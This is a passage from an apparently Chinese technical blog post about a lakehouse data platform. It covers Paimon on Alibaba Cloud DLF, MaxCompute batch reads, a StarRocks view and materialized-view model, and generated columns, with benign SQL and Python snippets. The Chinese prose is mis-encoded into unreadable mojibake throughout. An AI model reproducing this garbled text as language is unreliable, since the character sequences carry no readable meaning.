<p>å…¶æ¬¡ï¼Œè¯¥æ¹–ä»“æ¶æ„æ”¯æŒå¤šç§è®¡ç®—æ¨¡å¼ä¹‹é—´çš„å¹³æ»‘åˆ‡æ¢ã€‚æ‰¹å¤„ç†ã€æµå¤„ç†ä»¥åŠå¢é‡è®¡ç®—ç­‰ä¸åŒç±»å‹çš„è®¡ç®—ä»»åŠ¡å¯ä»¥åœ¨åŒä¸€å¹³å°ä¸Šè¿›è¡Œï¼Œæ— éœ€é¢å¤–çš„è¿ç§»æˆæœ¬ã€‚è¿™ç§å¤šæ¨¡å¼è®¡ç®—çš„æ”¯æŒæå¤§åœ°æé«˜äº†ç³»ç»Ÿçš„é€‚åº”æ€§å’Œæ•ˆç‡ã€‚ä¾‹å¦‚ï¼Œåœ¨é¢å¯¹å¤§è§„æ¨¡å†å²æ•°æ®åˆ†ææ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨æ‰¹å¤„ç†æ¨¡å¼ï¼›è€Œåœ¨éœ€è¦å®æ—¶å“åº”ä¸šåŠ¡å˜åŒ–çš„æƒ…å†µä¸‹ï¼Œåˆ™å¯ä»¥å¿«é€Ÿåˆ‡æ¢è‡³æµå¤„ç†æ¨¡å¼ã€‚æ­¤å¤–ï¼Œå¯¹äºé‚£äº›åªéœ€å¯¹æ–°å¢æ•°æ®è¿›è¡Œå¤„ç†çš„åœºæ™¯ï¼Œå¢é‡è®¡ç®—æ¨¡å¼åˆ™èƒ½å¤Ÿæ˜¾è‘—æå‡æ€§èƒ½å¹¶å‡å°‘èµ„æºæ¶ˆè€—ã€‚
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f603d46996a45b18b30385d84bf3288~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=Udqz7ctA8uFRX10FZkQw0dNaBjA%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-4">äºŒã€æ¹–ä»“æ€è€ƒ</h2>
<p>åœ¨æ¢ç´¢æ¹–ä»“æ¶æ„çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬é‡åˆ°äº†ä¸€äº›æŒ‘æˆ˜ã€‚å¸‚åœºä¸Šå­˜åœ¨å¤šç§ä¸åŒçš„æ¹–ä»“è§£å†³æ–¹æ¡ˆï¼Œå°½ç®¡å®ƒä»¬éƒ½å£°ç§°èƒ½å¤Ÿæä¾›â€œä¸€ä½“åŒ–â€çš„ä½“éªŒï¼Œä½†å®é™…ä¸Šç”±äºæ ‡å‡†ä¸ä¸€ã€æœ¯è¯­æ··ä¹±ç­‰å› ç´ ï¼Œå¯¼è‡´ä¸åŒäº§å“ä¹‹é—´éš¾ä»¥å®ç°æ— ç¼é›†æˆã€‚ä¾‹å¦‚ï¼š</p>
<ul>
<li>
<p><strong>MaxCompute</strong>Â ä¸»è¦ç”¨äºå…¶å†…éƒ¨è¡¨çš„å¤§æ‰¹é‡å¤„ç†å·¥ä½œï¼Œå…¶æ¨å‡ºçš„æ¹–ä»“èƒ½åŠ›è¿˜æ˜¯å¤–æŒ‚æ•°æ®ï¼Œæ²¡æœ‰åšåˆ°æ•°æ®é—´æ— ç¼è¡”æ¥ï¼Œæ•°æ®æ ¼å¼ä¸å¤Ÿå¼€æ”¾å’Œäº‘å‚å•†å¼ºç»‘å®šï¼ŒOLAPé€Ÿåº¦è¾ƒä¸ºä¸ç†æƒ³ã€‚</p>
</li>
<li>
<p><strong>StarRocks</strong>Â è™½ç„¶æ ‡æ¦œä¸ºæ¹–ä»“è§£å†³æ–¹æ¡ˆä¹‹ä¸€ï¼Œä½†åœ¨å¤„ç†å¤§è§„æ¨¡ç¦»çº¿ä»»åŠ¡æ—¶ä»æ˜¾ä¸è¶³ã€‚</p>
</li>
<li>
<p><strong>æ•°æ®æ¹–ï¼ˆIcebergã€Hudiã€DeltaÂ lakeï¼‰</strong> ä¸‰å‰‘å®¢åœ¨æ•´ä½“ä¸Šå‡å¯ä»¥æ»¡è¶³æˆ‘ä»¬å¯¹æ¹–ä»“çš„æ€è€ƒå’Œå®šä½ï¼Œä½†æ˜¯å…¶æµå¤„ç†èƒ½åŠ›ç•¥æ˜¾ä¸è¶³ã€‚</p>
</li>
<li>
<p><strong>Paimon</strong>æ•°æ®æ¹–æ—¢èƒ½æ»¡è¶³æµè®¡ç®—ä¹Ÿèƒ½æ»¡è¶³æ‰¹é‡è®¡ç®—éœ€æ±‚ï¼Œä½†æ˜¯æ²¡åŠæ³•è§£å†³å®æ—¶æ•°æ®æ–°é²œåº¦çš„é—®é¢˜ã€‚</p>
</li>
<li>
<p><strong>å¤šæ¨¡æ€æ•°æ®ï¼š</strong> AIåœºæ™¯çš„å¤šæ¨¡æ€æ•°æ®è®¡ç®—å’Œæ£€ç´¢ã€‚</p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f839c4e4e8a14c62a9ad6e5b60e3e253~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=XooDsGihjuJmpOKsYARIasNixmA%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-5">ä¸‰ã€æ¹–ä»“é€‰å‹</h2>
<h3 data-id="heading-6">3.1ã€æ€è€ƒç‚¹</h3>
<p>å½“å‰ï¼Œå¤§æ•°æ®æŠ€æœ¯é¢†åŸŸå‘ˆç°å‡ºç™¾èŠ±é½æ”¾çš„æ€åŠ¿ï¼Œè¿™ä¸ºç”¨æˆ·åœ¨é€‰æ‹©åˆé€‚çš„å·¥å…·å’ŒæŠ€æœ¯æ ˆæ—¶å¸¦æ¥äº†æŒ‘æˆ˜ã€‚ä»è¡Œä¸šå®è·µæ¥çœ‹ï¼ŒApacheÂ Sparkå·²æˆä¸ºæ‰¹å¤„ç†çš„äº‹å®æ ‡å‡†ï¼Œè€ŒApacheÂ Flinkåˆ™æ˜¯æµè®¡ç®—çš„äº‹å®æ ‡å‡†ï¼›è‡³äºæ•°æ®æ¹–è§£å†³æ–¹æ¡ˆï¼ŒApacheÂ Icebergæ­£é€æ¸æˆä¸ºä¸šç•Œå…±è¯†çš„é€‰æ‹©ä¹‹ä¸€ã€‚æ­¤å¤–ï¼Œéšç€äººå·¥æ™ºèƒ½ï¼ˆAIï¼‰è®¡ç®—éœ€æ±‚çš„å¢é•¿ï¼Œå‘é‡æ£€ç´¢ä¸æœºå™¨å­¦ä¹ ï¼ˆMLï¼‰ç­‰é¢†åŸŸä¹Ÿæ—¥ç›Šå—åˆ°é‡è§†ã€‚</p>
<p>å¯¹äºç»ˆç«¯ç”¨æˆ·è€Œè¨€ï¼Œä¾èµ–å•ä¸€è®¡ç®—å¼•æ“å¹¶ä¸ç¬¦åˆå®é™…éœ€æ±‚ã€‚å› æ­¤ï¼Œæ„å»ºä¸€ä¸ªèƒ½å¤Ÿæ”¯æŒå¤šç§è®¡ç®—å¼•æ“åŒæ—¶å·¥ä½œçš„ç”Ÿæ€ç³»ç»Ÿæ˜¾å¾—å°¤ä¸ºé‡è¦ã€‚å…³é”®åœ¨äºå®ç°å­˜å‚¨å±‚çš„æ•°æ®æ ¼å¼æ ‡å‡†åŒ–ï¼Œç¡®ä¿ä¸åŒç±»å‹çš„è®¡ç®—ä»»åŠ¡å‡å¯ç›´æ¥è®¿é—®ç›¸åŒçš„æ•°æ®æºï¼Œè€Œæ— éœ€ç»å†å¤æ‚çš„è½¬æ¢è¿‡ç¨‹ã€‚æ¢å¥è¯è¯´ï¼Œå°±æ˜¯è¦æ‰“ç ´æ•°æ®ä¸ç‰¹å®šå¤„ç†æ¡†æ¶ä¹‹é—´çš„ç»‘å®šå…³ç³»ï¼Œé‡‡ç”¨å¼€æ”¾ä¸”å…¼å®¹æ€§å¼ºçš„æ•°æ®å­˜å‚¨æ ¼å¼ï¼Œä½¿å¾—æ— è®ºä½•ç§è®¡ç®—å¼•æ“éƒ½èƒ½å¤Ÿè½»æ¾åœ°æ ¹æ®æ—¢å®šè§„èŒƒè¯»å–å¹¶å¤„ç†è¿™äº›ä¿¡æ¯ã€‚</p>
<h3 data-id="heading-7">3.2ã€æŠ€æœ¯é€‰å‹</h3>
<p>åœ¨æ„å»ºå¼€æ”¾æ•°æ®æ¹–çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬æ—¨åœ¨æ‰“ç ´æ•°æ®å­¤å²›ï¼Œç¡®ä¿æ•°æ®ä¸è¢«ç»‘å®šäºå•ä¸€è®¡ç®—å¼•æ“ï¼ŒåŒæ—¶å‡å°‘å­˜å‚¨æˆæœ¬ä¸ä½¿ç”¨æˆæœ¬ã€‚ç»è¿‡å¯¹Paimonã€Icebergã€HudiåŠDeltaÂ Lakeç­‰æ–¹æ¡ˆçš„æ·±å…¥è°ƒç ”åï¼ŒåŸºäºä»¥ä¸‹å‡ ç‚¹è€ƒé‡ï¼š</p>
<ol>
<li>
<p><strong>æ‰¹å¤„ç†å’Œæµå¤„ç†èƒ½åŠ›</strong>ï¼šèƒ½åŒæ—¶æ»¡è¶³æ‰¹è®¡ç®—å’Œæµè®¡ç®—çš„åœºæ™¯ã€‚</p>
</li>
<li>
<p><strong>æ”¯æŒå¤šæ ·åŒ–è®¡ç®—æ¨¡å¼</strong>ï¼šè¦æ±‚èƒ½å¤Ÿæ— ç¼æ”¯æŒæµå¼ä¸æ‰¹å¤„ç†è®¡ç®—ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºéƒ¨åˆ†åˆ—æ›´æ–°ã€èšåˆè¡¨ã€ç´¢å¼•ç­‰åŠŸèƒ½ã€‚</p>
</li>
<li>
<p><strong>ç”Ÿæ€å…¼å®¹æ€§</strong>ï¼šé«˜åº¦é›†æˆFlinkã€Sparkã€StarRocksç­‰ä¸»æµè®¡ç®—æ¡†æ¶ã€‚</p>
</li>
<li>
<p><strong>ç¤¾åŒºæ´»è·ƒåº¦</strong>ï¼šæ´»è·ƒçš„å¼€å‘è€…ç¤¾åŒºã€å¿«é€Ÿå“åº”é—®é¢˜å¹¶æŒç»­åˆ›æ–°çš„èƒ½åŠ›ã€‚</p>
</li>
<li>
<p><strong>æ•°æ®æ–°é²œåº¦</strong>ï¼šå¯ä»¥å’ŒFlussç»“åˆï¼Œå¼¥è¡¥æ•°æ®æ–°é²œåº¦çš„ä¸è¶³ã€‚</p>
</li>
<li>
<p><strong>å¤šæ¨¡æ€æ•°æ®ï¼š</strong> å¯ä»¥æ”¯æŒå¤šæ¨¡æ€æ•°æ®æ£€ç´¢å’Œè®¡ç®—ã€‚</p>
</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4746ef67e9e247b19889c2057cb3711a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=nXc3mWM6VDm4cNewpbEjfcXHtVg%3D" alt="image.png" loading="lazy"/></p>
<p>ç»¼ä¸Šæ‰€è¿°ï¼ŒåŸºäºé˜¿é‡Œäº‘OpenLakeè§£å†³æ–¹æ¡ˆï¼Œæœ€ç»ˆå†³å®šé‡‡ç”¨Paimonä½œä¸ºæ ¸å¿ƒæ•°æ®æ¹–æŠ€æœ¯ï¼ŒFlussä½œä¸ºå¼¥è¡¥Paimonæ•°æ®æ–°é²œåº¦ä¸è¶³çš„å‰ç½®å¤„ç†ï¼Œå¹¶é€šè¿‡é˜¿é‡Œäº‘æä¾›çš„å…¨æ‰˜ç®¡ServerlessæœåŠ¡å½¢å¼éƒ¨ç½²ï¼Œå³å•†ä¸šç‰ˆDLFï¼ˆé›†æˆäº†Paimonã€å…ƒæ•°æ®ç®¡ç†å’Œserverlessæ¶æ„ã€é‰´æƒï¼‰ã€‚è¿™ä¸€æ¶æ„ä¸ä»…æ»¡è¶³äº†é¡¹ç›®å¯¹äºçµæ´»æ€§ã€æ€§èƒ½å’Œå®‰å…¨æ€§æ–¹é¢çš„éœ€æ±‚ï¼Œè¿˜å……åˆ†åˆ©ç”¨äº†äº‘è®¡ç®—çš„ä¼˜åŠ¿æ¥é™ä½è¿ç»´å¤æ‚åº¦ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7216d4c82a5b4cf5bb295c8cee732dab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=ZiK%2BywWNVyMYO1%2F01YP4CnRA0yU%3D" alt="image.png" loading="lazy"/></p>
<p>å›¾ç‰‡å‚è€ƒï¼šé˜¿é‡Œäº‘OpenLakeè§£å†³æ–¹æ¡ˆ</p>
<h2 data-id="heading-8">å››ã€æ¹–ä»“/æ¹–æµä¸€ä½“</h2>
<h3 data-id="heading-9">4.1ã€ç¦»çº¿è®¡ç®—DLF+MaxCompute</h3>
<p>æˆ‘ä»¬èˆå¼ƒäº†å†…éƒ¨æ•°ä»“ä¸­ä¹‹å‰ETLä½œä¸šï¼Œç›´æ¥åœ¨æ•°æ®æ ‡å‡†å±‚ï¼ˆdwdï¼‰ç›´è¯»DLFä¸­çš„æ•°æ®ï¼Œå¾—ç›ŠäºMaxComputeæ”¯æ’‘çš„ä¸‰å±‚æ•°æ®è®¿é—®æ¨¡å‹ï¼Œæˆ‘ä»¬ä»…éœ€è¦è½»å¾®çš„æ”¹åŠ¨ï¼Œç›´æ¥å¯ä»¥æ›¿æ¢ä¹‹å‰ODSå±‚çš„æ•°æ®ã€‚</p>
<pre><code class="hljs language-plaintext" lang="plaintext">SET odps.namespace.schema = true;  -- å¼€å¯ä¸‰å±‚æ•°æ®è®¿é—®æ¨¡å‹

INSERT OVERWRITE TABLE dwd_user_basic
SELECT
  corp_id,
  user_id,
  active,
  status,
  union_id,
  id,
  CAST(gmt_create   AS DATETIME) AS gmt_create,
  CAST(gmt_modified AS DATETIME) AS gmt_modified
FROM paimon_catalog.xxdb_prod.user_basic_table
WHERE active = 1;
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de5dd9005830402595ac0ed7fcc52ac2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=eXB682sTl84lwoBC8pxLXDDrOLQ%3D" alt="image.png" loading="lazy"/></p>
<p>MaxComputeä¸­ä¸Šå±‚è¡¨çš„åŠ å·¥ã€è®¡ç®—é€»è¾‘ä¸å˜ï¼Œå¯¹äºéœ€è¦å­˜å…¥æ•°æ®æ¹–çš„æ•°æ®ç›´æ¥å†™å…¥Paimonä¸­ï¼Œä¾›Flinkã€StarocksæŸ¥è¯¢è®¡ç®—ï¼Œå¦‚æœç”¨æˆ·ä½¿ç”¨çš„æ˜¯ApacheÂ Sparkï¼Œè¿™é‡ŒåŒæ ·å¯ä»¥åšåˆ°å¯æ›¿æ¢æˆApacheÂ Sparkä½œä¸ºæ‰¹è®¡ç®—å¼•æ“ã€‚</p>
<h4 data-id="heading-10">4.1.1ã€AGGÂ Tableï¼ˆèšåˆè¡¨ï¼‰</h4>
<p>æˆ‘ä»¬ä¸€ç›´éœ€è¦AggÂ Tableçš„èƒ½åŠ›ï¼Œä»¥æ˜¾è‘—é™ä½å‘¨æœŸç´¯è®¡è¡¨çš„æ•°æ®è®¡ç®—æˆæœ¬ã€‚å°½ç®¡MaxComputeç›®å‰å°šä¸æ”¯æŒè¿™ä¸€åŠŸèƒ½ï¼Œä½†æˆ‘ä»¬å·²å°†æ­¤èƒ½åŠ›è¿ç§»åˆ°æ•°æ®æ¹–Paimonä¸­ï¼Œå¹¶æˆåŠŸå°†é«˜æˆæœ¬çš„åŸ‹ç‚¹å‘¨æœŸç´¯è®¡è¡¨è´¹ç”¨é™ä½äº†70%ã€‚å¯¹äºå‘¨æœŸç´¯ç§¯è¡¨ï¼Œé‡‡ç”¨Paimonåï¼Œæ¯æ—¥T+1è®¡ç®—ä»…éœ€å¤„ç†å¢é‡æ•°æ®ï¼Œè€Œæ— éœ€åƒåœ¨MaxComputeä¸­é‚£æ ·å…¨é‡åˆå¹¶å†å²ä¸æ–°å¢æ•°æ®æ¥æ±‚å–äº‹ä»¶äº‹å®çš„æœ€å¤§ã€æœ€å°å€¼ï¼ˆå¦‚æ—¶é—´ï¼‰ã€‚åœ¨Maxcomputeä¸­ï¼Œåªéœ€å°†æ–°äº§ç”Ÿçš„æ•°æ®æ’å…¥DLFï¼Œç”±å…¶åå°è‡ªåŠ¨å®Œæˆåˆå¹¶å·¥ä½œï¼Œä½†å­˜åœ¨çº¦1è‡³10åˆ†é’Ÿçš„å»¶è¿Ÿã€‚é‰´äºæ— æ³•å‡†ç¡®å¾—çŸ¥DLFå®Œæˆæ•°æ®åˆå¹¶çš„å…·ä½“æ—¶åˆ»ï¼Œæˆ‘ä»¬åœ¨Dataworksé‡Œå¢è®¾äº†ä¸€ä¸ªPythonèŠ‚ç‚¹ï¼Œè®¾å®šè¯¥èŠ‚ç‚¹ä¼‘çœ 10åˆ†é’Ÿåæ‰å¯åŠ¨ä¸‹æ¸¸ä»»åŠ¡è°ƒåº¦ï¼Œç¡®ä¿æ—¢ä¸å½±å“æ•´ä½“æµç¨‹åˆèƒ½è·å–åˆ°æœ€æ–°çš„AggÂ Tableçš„æ•°æ®ã€‚</p>
<pre><code class="hljs language-plaintext" lang="plaintext">import time

# ç»™ Paimon è¿›è¡Œ compaction é¢„ç•™å»¶è¿Ÿæ—¶é—´ï¼Œå¸®åŠ©ä¸‹æ¸¸ä½¿ç”¨ã€‚
time.sleep(60 * 10)

print("ç¡çœ  10 åˆ†é’Ÿç»“æŸ")
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d50ab366e0824b48b7bc940112bae4ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=E0dgCvWGVfgHPTez6BoVmEztodw%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-11">4.2ã€OLAPåœºæ™¯Â DLF+StarRocks</h3>
<p>LakeHouseæ¶æ„æ— ç–‘æ˜¯å½“å‰å¤§æ•°æ®çš„å‘å±•å’Œè¶‹åŠ¿ï¼Œé€šè¿‡LakeHouseæ¶æ„æˆ‘ä»¬å¯ä»¥æ— ç¼é›†æˆå¤šSourceæ•°æ®ï¼Œä¸è®©æ•°æ®å¼ºè¡Œç»‘å®šåœ¨å•ä¸€è®¡ç®—å¼•æ“ä¸Šï¼Œè§£å†³è¿‡å»æ— æ³•ä»å•ä¸€çš„äº§å“ä¸­å¿«é€Ÿè§£æ”¾å‡ºæ¥ï¼Œå‡å°‘ETLè¿‡ç¨‹å’Œæ•°æ®å¤æ‚åº¦ï¼Œåœ¨ä¸æ”¹å˜åŸæœ‰ä¸šåŠ¡çš„æƒ…å†µä¸‹ï¼ŒÂ è¿›è¡Œæé€Ÿåˆ†æã€‚</p>
<h4 data-id="heading-12">4.2.1ã€å»ºæ¨¡è¿‡ç¨‹</h4>
<p>æ—©æœŸå»ºæ¨¡ä½¿ç”¨å¼‚æ­¥ç‰©åŒ–è§†å›¾è¡¨è¿›è¡Œå»ºæ¨¡ï¼Œä½†æ˜¯ä¼šå­˜åœ¨å»¶è¿Ÿé—®é¢˜ï¼Œæ— æ³•ä½¿ç”¨æœ€æ–°é²œçš„odsçš„æ•°æ®ï¼Œæ¯ä¸€å±‚çš„è°ƒåº¦éƒ½å­˜åœ¨ä¸€å®šçš„å»¶è¿Ÿå¯èƒ½ï¼Œå¦‚æœæ˜¯3å±‚ï¼Œæ¯ä¸€å±‚æ˜¯å®šæ—¶5åˆ†é’Ÿåˆ·æ–°ä¸€æ¬¡ï¼Œå¦‚æœåˆšå¥½å¡ä¸Šæ—¶é—´ç‚¹ï¼Œæ•°æ®ä»odsåˆ°adså±‚çš„æ•°æ®å»¶è¿Ÿæœ€å¤§èƒ½è¾¾åˆ°è¿‘15åˆ†é’Ÿï¼Œä¸Šå±‚adså±‚çš„æ•°æ®æœ€å¤§å»¶è¿Ÿæ—¶é—´æ˜¯ç‰©åŒ–è¯•å›¾åˆ·æ–°æ—¶é—´å¯èƒ½ä¼šè¾¾åˆ°æœ€å¤§å€¼æ‰èƒ½å±•ç¤ºæ•°æ®ã€‚</p>
<p>é’ˆå¯¹ä¸Šè¿°æƒ…å†µï¼Œç»“åˆé˜¿é‡Œäº‘å’ŒStarRcocksåˆ†äº«æ¡ˆä¾‹ï¼Œé‡‡ç”¨viewÂ sqlï¼ˆé€»è¾‘è§†å›¾ï¼‰å»ºæ¨¡ä¸ºä¸»ï¼Œè¿™ä¹ˆåšçš„å¥½å¤„æ˜¯ï¼ŒviewÂ tableÂ å­˜å‚¨çš„æ•°æ®sqlçš„é€»è¾‘ï¼Œç›´æ¥æ‰§è¡Œåä¼šæŠŠéœ€è¦è¿›è¡ŒæŸ¥è¯¢çš„æ•°æ®é€ä¼ åˆ°æœ€åº•å±‚çš„odså±‚ã€‚ä¿è¯æ•°æ®æ–°é²œåº¦æ˜¯è‡ªå·±å‡†å®æ—¶çš„æ•°æ®ï¼Œè€Œä¸”åˆ©ç”¨äº†viewÂ tableÂ æ¥è¿›è¡Œäº†åˆ†å±‚ï¼Œè¿™æ ·ä¿è¯äº†æ¯ä¸€å±‚åªå¤„ç†äº†è‡ªå·±ç›¸å…³çš„ä¸šåŠ¡é€»è¾‘ï¼ŒÂ ä½†è¿™ä¹ˆå¤„ç†å»ºæ¨¡é€»è¾‘æ´»æˆï¼Œå³ä¼šæœ‰ä¼˜ç‚¹ï¼Œä¹Ÿä¼šæœ‰ç¼ºç‚¹ï¼Œä¸»è¦ä½“ç°å¦‚ä¸‹ï¼š</p>
<p>1ã€ä¸»è¦ä¼˜ç‚¹ï¼š</p>
<p>viewÂ tableæ˜¯æ— çŠ¶æ€çš„ï¼ŒviewÂ tableé‡Œé¢åªå­˜å‚¨äº†DQLÂ æŸ¥è¯¢è¯­å¥ï¼Œæ¯æ¬¡åªéœ€è¦è¿›è¡Œç›¸å…³viewÂ è¡¨çš„é€»è¾‘å³å¯ï¼Œä¸éœ€è¦å…³å¿ƒåº•å±‚çš„æ•°æ®ã€‚æŒ‰ç…§é€»è¾‘å°å±‚ï¼Œå¯¹äºå»ºæ¨¡è¿‡ç¨‹æ˜¯éå¸¸åˆç†çš„ï¼Œå¼€å‘æˆæœ¬å¾ˆä½ã€‚</p>
<p>2ã€ä¸»è¦ç¼ºç‚¹ï¼š</p>
<p>å› ä¸ºviewÂ è¡¨æ²¡æœ‰å­˜å‚¨æ•°æ®ï¼Œç”¨æˆ·åœ¨æŸ¥è¯¢viewè¡¨çš„æ—¶å€™ä¼šé€ä¼ åˆ°æœ€åº•å±‚çš„odså®ä½“è¡¨ä¸­æ¥æ‰«ææ•°æ®ï¼Œå¦‚æœodså±‚çš„åŸºè¡¨æ•°æ®é‡å¾ˆå¤§ä¸”æ²¡æœ‰ç»è¿‡åŠ å·¥ï¼Œé‚£ä¹ˆolapçš„é€Ÿåº¦ä¸ä¼šå¾—åˆ°æ˜æ˜¾æå‡ã€‚ç”¨æˆ·ç«¯ä½“éªŒä¸æ˜¯å¾ˆå¥½ã€‚</p>
<p>é¢å¯¹ä¸Šé¢çš„ç¼ºç‚¹ï¼Œæˆ‘ä»¬ç‰©åŒ–è§†å›¾/ç”Ÿæˆåˆ—ä¸­ä½¿ç”¨è§£å†³åŠæ³•å¸®åŠ©ç”¨æˆ·è¿›è¡ŒåŠ é€ŸOLAPå¤§æŸ¥è¯¢</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c766ca24da4c4db6b52d535767fe964b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=xqMKIo62xMekXFB7UzAzvhEBBIc%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-13">4.2.2ã€ç‰©åŒ–è§†å›¾/ç”Ÿæˆåˆ—åŠ é€Ÿ+é€æ˜æ”¹å†™</h4>
<p>å¯¹äºæŠ¥è¡¨ä¸­éœ€è¦é€å‡ºçš„OLAPÂ è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥æ–°å»ºä¸€ä¸ªå’ŒviewÂ tableé€»è¾‘ç›¸åŒçš„ç‰©åŒ–è§†å›¾æ¥è¿›è¡ŒåŠ é€Ÿã€‚æ¯10åˆ†é’Ÿè¿›è¡Œä¸€æ¬¡è°ƒåº¦ä»»åŠ¡ï¼Œè¿™é‡Œæ˜¯æ¯æ¬¡å…¨é‡çš„å¼‚æ­¥ç‰©åŒ–è§†å›¾åˆ·æ–°ã€‚</p>
<p>ç”¨æˆ·å¯ä»¥æ ¹æ®è‡ªå·±çš„å®é™…ä¸šåŠ¡æƒ…å†µæ¥è¿›è¡Œç‰©åŒ–è§†å›¾çš„æ›´æ–°æ–¹å¼ï¼Œç›®å‰StarRocksçš„å¼‚æ­¥ç‰©åŒ–è§†å›¾åˆ·æ–°ä¸»è¦æ˜¯ä¸¤ç§ï¼Œä¸€ç§æ˜¯å¼‚æ­¥çš„å…¨é‡ï¼Œå¦ä¸€ç§æ˜¯å¼‚æ­¥çš„åˆ†åŒºå¢é‡çº§åˆ«åˆ·æ–°ï¼Œåˆ†åŒºå¢é‡åˆ·æ–°éœ€è¦ä¾èµ–åŸºè¡¨æ˜¯åˆ†åŒºè¡¨æ‰å¯ä»¥å®ç°ï¼Œå¦‚æœä¸šåŠ¡è¡¨æ²¡æœ‰åˆ†åŒºï¼Œå…¨é‡çš„å¼‚æ­¥ç‰©åŒ–è§†å›¾åˆ·æ–°æ˜¯æ¯”è¾ƒè€—è´¹å†…å­˜å’Œcpu+è¿è¡Œæ—¶é—´ã€‚</p>
<h4 data-id="heading-14">4.2.3ã€ç”Ÿæˆåˆ—ï¼ˆGeneratedÂ Columnï¼‰</h4>
<p>ä¸šåŠ¡DBå…·æœ‰å¾ˆå¤šçš„åŠç»“æ„åŒ–æ•°æ®ï¼Œå°½ç®¡StarRocksåœ¨æ—©æœŸå°±å¯¹JSONæ•°æ®ç±»å‹è¿›è¡Œäº†ä¼˜åŒ–ï¼Œä½†æ˜¯æŸ¥è¯¢ä¸€ä¸ªJSONä¸­çš„æ•°æ®è¿œä¸å¦‚ç›´æ¥æŸ¥è¯¢ä¸€ä¸ªå­—æ®µæ¥çš„æ£€ç´¢æ•ˆç‡é«˜ï¼Œè¿™æ—¶å€™æˆ‘ä»¬é‡‡ç”¨ç”Ÿæˆåˆ—ï¼ŒæŠŠJSONä¸­ä¸€äº›å›ºå®šå­—æ®µè„±ç¦»å‡ºæ¥ï¼Œåœ¨ä¸å½±å“åŸæœ‰çš„ä¸šåŠ¡é€»è¾‘ï¼ŒæŸ¥è¯¢æ•ˆç‡çº¦ç­‰äºæŸ¥è¯¢å›ºå®šå­—æ®µçš„æ•ˆç‡ã€‚Â </p>
<p><strong>è¯­æ³•å¦‚ä¸‹ï¼Œå¯ä»¥åœ¨å»ºè¡¨çš„æ—¶å€™åˆ›å»ºï¼Œä¹Ÿå¯ä»¥åæœŸå¢åŠ ï¼Œä¸å½±å“æºè¡¨çš„ä»»ä½•é€»è¾‘</strong></p>
<pre><code class="hljs language-plaintext" lang="plaintext">col_name data_type [NULL] AS generation_expr [COMMENT 'string'];
</code></pre>
<p><strong>æŸ¥è¯¢æ”¹å†™</strong></p>
<p>å¦‚æœæŸ¥è¯¢ä¸­çš„è¡¨è¾¾å¼ä¸æŸä¸ªç”Ÿæˆåˆ—çš„è¡¨è¾¾å¼åŒ¹é…ï¼Œåˆ™ä¼˜åŒ–å™¨ä¼šè‡ªåŠ¨è¿›è¡ŒæŸ¥è¯¢æ”¹å†™ï¼Œç›´æ¥è¯»å–ç”Ÿæˆåˆ—çš„å€¼ï¼Œè¿™é‡Œä¸éœ€è¦ç”¨æˆ·çš„ä»»ä½•æ“ä½œï¼Œæå¤§çš„æ–¹ä¾¿äº†æ•°æ®å¼€å‘å’Œæ•°æ®æ¨¡å‹çš„ç»´æŠ¤ã€‚</p>
<pre><code class="hljs language-plaintext" lang="plaintext">-- åæœŸå¢åŠ ç”Ÿæˆåˆ—ï¼ˆä¹Ÿå¯ä»¥åœ¨å»ºè¡¨è¯­å¥æ—¶ç›´æ¥å®šä¹‰ç”Ÿæˆåˆ—ï¼‰
ALTER TABLE ods_hrm_basic
ADD COLUMN dept_name STRING
AS get_json_string(data, '$.dept_name')
COMMENT 'éƒ¨é—¨åç§°';

